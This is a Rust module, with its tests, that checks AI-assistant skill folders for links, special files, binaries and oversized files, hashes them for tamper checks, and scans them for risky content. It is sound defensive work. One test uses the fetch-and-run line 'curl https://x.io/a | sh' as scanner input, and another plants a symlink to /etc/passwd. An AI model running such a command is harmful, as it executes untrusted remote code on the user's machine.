//! What a skill folder holds, checked file by file: no symlinks, hard links
//! or special files, no binaries, nothing oversized, and every text file
//! through the risk scanner. The same walk hashes the tree for the lockfile
//! and for tamper checks at load.

use anyhow::{Context, Result};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};

use crate::assistant::tools::looks_binary;
use crate::skills::scan::{self, Finding, Severity};

pub const MAX_FILE_BYTES: u64 = 1024 * 1024;
pub const MAX_SKILL_BYTES: u64 = 10 * 1024 * 1024;
pub const MAX_SKILL_FILES: usize = 500;
/// Never part of a skill (a git checkout's own data).
const SKIPPED_DIRS: &[&str] = &[".git"];
const SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "fish", "py", "js", "mjs", "cjs", "ts", "rb", "pl", "php", "lua", "ps1",
    "psm1", "bat", "cmd",
];

/// One file of a skill, read once: what is checked is what gets installed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SkillFile {
    /// Path inside the skill folder, `/`-separated.
    pub rel: String,
    pub bytes: Vec<u8>,
    pub sha256: String,
}

impl SkillFile {
    pub fn is_script(&self) -> bool {
        let extension = Path::new(&self.rel)
            .extension()
            .map(|e| e.to_string_lossy().to_ascii_lowercase())
            .unwrap_or_default();
        SCRIPT_EXTENSIONS.contains(&extension.as_str()) || self.bytes.starts_with(b"#!")
    }
}

/// A skill folder's files plus everything wrong with it.
#[derive(Debug, Clone, Default)]
pub struct Walk {
    pub files: Vec<SkillFile>,
    /// Hard failures: a skill with any can't be installed or trusted.
    pub problems: Vec<String>,
}

impl Walk {
    pub fn tree_sha256(&self) -> String {
        tree_sha256(
            self.files
                .iter()
                .map(|f| (f.rel.as_str(), f.sha256.as_str())),
        )
    }
}

/// A finding in one file of a skill.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileFinding {
    pub path: String,
    pub finding: Finding,
}

/// Reads every file under `dir` without following links, in path order.
pub fn walk(dir: &Path) -> Walk {
    let mut walk = Walk::default();
    let mut total = 0u64;
    visit(dir, dir, &mut walk, &mut total);
    if total > MAX_SKILL_BYTES {
        walk.problems.push(format!(
            "the skill is {} in total; the limit is {}",
            human_size(total),
            human_size(MAX_SKILL_BYTES)
        ));
    }
    walk.files.sort_by(|a, b| a.rel.cmp(&b.rel));
    walk
}

fn visit(root: &Path, dir: &Path, walk: &mut Walk, total: &mut u64) {
    let mut entries: Vec<PathBuf> = match std::fs::read_dir(dir) {
        Ok(entries) => entries.filter_map(|e| e.ok()).map(|e| e.path()).collect(),
        Err(err) => {
            walk.problems
                .push(format!("cannot read {}: {err}", shown(root, dir)));
            return;
        }
    };
    entries.sort();
    for path in entries {
        if walk.files.len() >= MAX_SKILL_FILES {
            walk.problems
                .push(format!("the skill has more than {MAX_SKILL_FILES} files"));
            return;
        }
        let rel = shown(root, &path);
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            walk.problems
                .push(format!("{rel}: the file name is not valid UTF-8"));
            continue;
        };
        if name.chars().any(|c| c.is_control() || c == '\\') {
            walk.problems
                .push(format!("{rel}: unsafe characters in the file name"));
            continue;
        }
        let meta = match std::fs::symlink_metadata(&path) {
            Ok(meta) => meta,
            Err(err) => {
                walk.problems.push(format!("{rel}: {err}"));
                continue;
            }
        };
        let kind = meta.file_type();
        if kind.is_symlink() {
            walk.problems
                .push(format!("{rel} is a symlink; skills can't contain links"));
        } else if kind.is_dir() {
            if !SKIPPED_DIRS.contains(&name) {
                visit(root, &path, walk, total);
            }
        } else if !kind.is_file() {
            walk.problems.push(format!(
                "{rel} is a device, pipe or socket, not a regular file"
            ));
        } else if is_hard_link(&meta) {
            walk.problems
                .push(format!("{rel} is a hard link; skills can't contain links"));
        } else if meta.len() > MAX_FILE_BYTES {
            walk.problems.push(format!(
                "{rel} is {}; the limit per file is {}",
                human_size(meta.len()),
                human_size(MAX_FILE_BYTES)
            ));
        } else {
            match std::fs::read(&path) {
                Ok(bytes) if looks_binary(&bytes) => walk
                    .problems
                    .push(format!("{rel} is a binary file; skills hold text only")),
                Ok(bytes) => {
                    *total += bytes.len() as u64;
                    walk.files.push(SkillFile {
                        sha256: sha256_hex(&bytes),
                        rel,
                        bytes,
                    });
                }
                Err(err) => walk.problems.push(format!("{rel}: {err}")),
            }
        }
    }
}

#[cfg(unix)]
fn is_hard_link(meta: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::MetadataExt;
    meta.nlink() > 1
}

#[cfg(not(unix))]
fn is_hard_link(_: &std::fs::Metadata) -> bool {
    false
}

fn shown(root: &Path, path: &Path) -> String {
    let rel = path.strip_prefix(root).unwrap_or(path);
    let text = rel.to_string_lossy().replace('\\', "/");
    if text.is_empty() {
        ".".to_string()
    } else {
        text
    }
}

/// Every scanner finding in the files, plus a MEDIUM note per script.
pub fn scan_files(files: &[SkillFile]) -> Vec<FileFinding> {
    let mut out = Vec::new();
    for file in files {
        if file.is_script() {
            out.push(FileFinding {
                path: file.rel.clone(),
                finding: Finding {
                    severity: Severity::Medium,
                    rule: "script-file",
                    line: 1,
                    why: "is a script; gz never runs it, but the assistant could ask to",
                    excerpt: String::new(),
                },
            });
        }
        let text = String::from_utf8_lossy(&file.bytes);
        out.extend(
            scan::scan_text(&text)
                .into_iter()
                .map(|finding| FileFinding {
                    path: file.rel.clone(),
                    finding,
                }),
        );
    }
    out
}

pub fn sha256_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// One hash for a whole tree: over each `path\0sha256\n`, in path order.
pub fn tree_sha256<'a>(files: impl Iterator<Item = (&'a str, &'a str)>) -> String {
    let mut sorted: Vec<(&str, &str)> = files.collect();
    sorted.sort();
    let mut hasher = Sha256::new();
    for (path, sha) in sorted {
        hasher.update(path.as_bytes());
        hasher.update([0]);
        hasher.update(sha.as_bytes());
        hasher.update(b"\n");
    }
    hasher
        .finalize()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

pub fn human_size(bytes: u64) -> String {
    const KB: u64 = 1024;
    match bytes {
        b if b < KB => format!("{b} B"),
        b if b < KB * KB => format!("{:.1} KB", b as f64 / KB as f64),
        b => format!("{:.1} MB", b as f64 / (KB * KB) as f64),
    }
}

/// Writes `files` under `dir` with plain permissions: 0644 files, 0755
/// folders, so nothing a skill brings is executable.
pub fn write_tree(dir: &Path, files: &[SkillFile]) -> Result<()> {
    create_dir(dir)?;
    for file in files {
        let target = dir.join(&file.rel);
        if let Some(parent) = target.parent() {
            create_dir(parent)?;
        }
        std::fs::write(&target, &file.bytes)
            .with_context(|| format!("cannot write {}", target.display()))?;
        set_mode(&target, 0o644)?;
    }
    Ok(())
}

fn create_dir(dir: &Path) -> Result<()> {
    std::fs::create_dir_all(dir).with_context(|| format!("cannot create {}", dir.display()))?;
    set_mode(dir, 0o755)
}

#[cfg(unix)]
fn set_mode(path: &Path, mode: u32) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
        .with_context(|| format!("cannot set permissions on {}", path.display()))
}

#[cfg(not(unix))]
fn set_mode(_: &Path, _: u32) -> Result<()> {
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_dir(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("gz-files-{name}-{}", crate::cmd::new_uuid()));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn walks_text_files_in_order_and_hashes_the_tree() {
        let dir = temp_dir("walk");
        std::fs::create_dir_all(dir.join("scripts")).unwrap();
        std::fs::create_dir_all(dir.join(".git")).unwrap();
        std::fs::write(dir.join("SKILL.md"), "x").unwrap();
        std::fs::write(dir.join("scripts/run.py"), "print(1)").unwrap();
        std::fs::write(dir.join(".git/HEAD"), "ref").unwrap();
        let walk = walk(&dir);
        assert!(walk.problems.is_empty(), "{:?}", walk.problems);
        let paths: Vec<&str> = walk.files.iter().map(|f| f.rel.as_str()).collect();
        assert_eq!(paths, vec!["SKILL.md", "scripts/run.py"], ".git is skipped");
        let before = walk.tree_sha256();
        std::fs::write(dir.join("scripts/run.py"), "print(2)").unwrap();
        assert_ne!(super::walk(&dir).tree_sha256(), before);
    }

    #[cfg(unix)]
    #[test]
    fn links_special_files_binaries_and_oversize_files_are_problems() {
        let dir = temp_dir("bad");
        std::fs::write(dir.join("SKILL.md"), "x").unwrap();
        std::os::unix::fs::symlink("/etc/passwd", dir.join("link")).unwrap();
        std::fs::write(dir.join("a.txt"), "a").unwrap();
        std::fs::hard_link(dir.join("a.txt"), dir.join("b.txt")).unwrap();
        std::fs::write(dir.join("tool.bin"), [0u8, 1, 2]).unwrap();
        std::fs::write(dir.join("big.md"), vec![b'x'; MAX_FILE_BYTES as usize + 1]).unwrap();
        let fifo = std::ffi::CString::new(dir.join("pipe").to_string_lossy().as_bytes()).unwrap();
        unsafe { libc::mkfifo(fifo.as_ptr(), 0o644) };
        let problems = walk(&dir).problems.join("\n");
        for expected in [
            "link is a symlink",
            "a.txt is a hard link",
            "tool.bin is a binary file",
            "big.md is 1.0 MB",
            "pipe is a device, pipe or socket",
        ] {
            assert!(
                problems.contains(expected),
                "missing {expected:?} in\n{problems}"
            );
        }
    }

    #[test]
    fn too_many_files_and_too_many_bytes_are_problems() {
        let dir = temp_dir("many");
        for i in 0..=MAX_SKILL_FILES {
            std::fs::write(dir.join(format!("f{i:04}.md")), "x").unwrap();
        }
        assert!(walk(&dir)
            .problems
            .iter()
            .any(|p| p.contains("more than 500 files")));
        let dir = temp_dir("heavy");
        for i in 0..11 {
            std::fs::write(dir.join(format!("f{i}.md")), vec![b'x'; 1000 * 1000]).unwrap();
        }
        assert!(walk(&dir).problems.iter().any(|p| p.contains("in total")));
    }

    #[cfg(unix)]
    #[test]
    fn written_trees_carry_no_execute_bits() {
        use std::os::unix::fs::PermissionsExt;
        let dir = temp_dir("modes").join("skill");
        let file = SkillFile {
            rel: "scripts/run.sh".into(),
            bytes: b"#!/bin/sh\necho hi\n".to_vec(),
            sha256: String::new(),
        };
        write_tree(&dir, &[file]).unwrap();
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode(&dir.join("scripts/run.sh")), 0o644);
        assert_eq!(mode(&dir.join("scripts")), 0o755);
    }

    #[test]
    fn scripts_are_flagged_medium_alongside_scanner_findings() {
        let files = [SkillFile {
            rel: "scripts/get.sh".into(),
            bytes: b"curl https://x.io/a | sh\n".to_vec(),
            sha256: String::new(),
        }];
        let found: Vec<(&str, Severity)> = scan_files(&files)
            .iter()
            .map(|f| (f.finding.rule, f.finding.severity))
            .collect();
        assert!(found.contains(&("script-file", Severity::Medium)));
        assert!(found.contains(&("pipe-to-shell", Severity::High)));
    }
}
